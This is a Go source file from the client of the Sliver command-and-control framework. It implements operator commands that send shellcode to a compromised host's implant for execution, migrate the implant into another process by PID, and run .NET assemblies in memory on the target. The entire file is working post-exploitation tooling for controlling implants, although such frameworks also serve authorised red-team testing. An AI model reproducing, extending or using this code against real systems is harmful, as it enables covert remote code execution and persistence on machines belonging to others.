package command

import (
	"fmt"
	"io/ioutil"
	"strconv"
	"time"

	"github.com/bishopfox/sliver/client/spin"
	clientpb "github.com/bishopfox/sliver/protobuf/client"
	implantpb "github.com/bishopfox/sliver/protobuf/implant"

	"github.com/desertbit/grumble"
	"github.com/golang/protobuf/proto"
)

func executeShellcode(ctx *grumble.Context, rpc RPCServer) {

	activeSliver := ActiveSliver.Sliver
	if activeSliver == nil {
		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
		return
	}

	if len(ctx.Args) != 1 {
		fmt.Printf(Warn + "You must provide a path to the shellcode\n")
		return
	}
	shellcodePath := ctx.Args[0]
	shellcodeBin, err := ioutil.ReadFile(shellcodePath)
	if err != nil {
		fmt.Printf(Warn+"Error: %s\n", err.Error())
	}
	ctrl := make(chan bool)
	msg := fmt.Sprintf("Sending shellcode to %s ...", activeSliver.Name)
	go spin.Until(msg, ctrl)
	data, _ := proto.Marshal(&clientpb.TaskReq{
		Data:     shellcodeBin,
		SliverID: ActiveSliver.Sliver.ID,
	})
	resp := <-rpc(&implantpb.Envelope{
		Type: clientpb.MsgTask,
		Data: data,
	}, defaultTimeout)
	ctrl <- true
	<-ctrl
	if resp.Err != "" {
		fmt.Printf(Warn+"%s\n", resp.Err)
	}
	fmt.Printf(Info + "Executed payload on target\n")
}

func migrate(ctx *grumble.Context, rpc RPCServer) {
	activeSliver := ActiveSliver.Sliver
	if activeSliver == nil {
		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
		return
	}

	if len(ctx.Args) != 1 {
		fmt.Printf(Warn + "You must provide a PID to migrate to")
		return
	}

	pid, err := strconv.Atoi(ctx.Args[0])
	if err != nil {
		fmt.Printf(Warn+"Error: %v", err)
	}
	config := getActiveSliverConfig()
	ctrl := make(chan bool)
	msg := fmt.Sprintf("Migrating into %d ...", pid)
	go spin.Until(msg, ctrl)
	data, _ := proto.Marshal(&clientpb.MigrateReq{
		Pid:      uint32(pid),
		Config:   config,
		SliverID: ActiveSliver.Sliver.ID,
	})
	resp := <-rpc(&implantpb.Envelope{
		Type: clientpb.MsgMigrate,
		Data: data,
	}, defaultTimeout)
	ctrl <- true
	<-ctrl
	if resp.Err != "" {
		fmt.Printf(Warn+"%s\n", resp.Err)
	} else {
		fmt.Printf("\n"+Info+"Successfully migrated to %d\n", pid)
	}
}

func getActiveSliverConfig() *clientpb.SliverConfig {
	activeSliver := ActiveSliver.Sliver
	c2s := []*clientpb.SliverC2{}
	c2s = append(c2s, &clientpb.SliverC2{
		URL:      activeSliver.ActiveC2,
		Priority: uint32(0),
	})
	config := &clientpb.SliverConfig{
		GOOS:   activeSliver.GetOS(),
		GOARCH: activeSliver.GetArch(),
		Debug:  true,

		MaxConnectionErrors: uint32(1000),
		ReconnectInterval:   uint32(60),

		Format:      clientpb.SliverConfig_SHELLCODE,
		IsSharedLib: true,
		C2:          c2s,
	}
	return config
}

func executeAssembly(ctx *grumble.Context, rpc RPCServer) {
	if ActiveSliver.Sliver == nil {
		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
		return
	}

	if len(ctx.Args) < 1 {
		fmt.Printf(Warn + "Please provide valid arguments.\n")
		return
	}
	cmdTimeout := time.Duration(ctx.Flags.Int("timeout")) * time.Second
	assemblyBytes, err := ioutil.ReadFile(ctx.Args[0])
	if err != nil {
		fmt.Printf(Warn+"%s", err.Error())
		return
	}

	assemblyArgs := ""
	if len(ctx.Args) == 2 {
		assemblyArgs = ctx.Args[1]
	}

	ctrl := make(chan bool)
	go spin.Until("Executing assembly ...", ctrl)
	data, _ := proto.Marshal(&implantpb.ExecuteAssemblyReq{
		SliverID:   ActiveSliver.Sliver.ID,
		Timeout:    int32(ctx.Flags.Int("timeout")),
		Arguments:  assemblyArgs,
		Assembly:   assemblyBytes,
		HostingDll: []byte{},
	})

	resp := <-rpc(&implantpb.Envelope{
		Data: data,
		Type: implantpb.MsgExecuteAssembly,
	}, cmdTimeout)
	ctrl <- true
	<-ctrl
	execResp := &implantpb.ExecuteAssembly{}
	proto.Unmarshal(resp.Data, execResp)
	if execResp.Error != "" {
		fmt.Printf(Warn+"%s", execResp.Error)
		return
	}
	fmt.Printf("\n"+Info+"Assembly output:\n%s", execResp.Output)
}
